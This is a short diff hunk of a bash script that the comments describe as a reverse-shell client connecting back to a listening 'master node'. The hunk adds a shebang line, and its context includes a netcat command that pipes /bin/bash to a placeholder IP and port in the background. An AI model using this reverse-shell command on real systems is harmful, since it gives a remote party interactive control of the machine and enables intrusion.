@@ -4,6 +4,7 @@
 # If not, then Reverse Bash will be used to establish connection.
 # This script needs to be run on client node, after the master node has begins listening.
 
+#!/bin/bash
 if which nc >/dev/null &> /dev/null; then
     echo NetCat Connected.
     nc IP-HERE PORT-HERE -e /bin/bash &
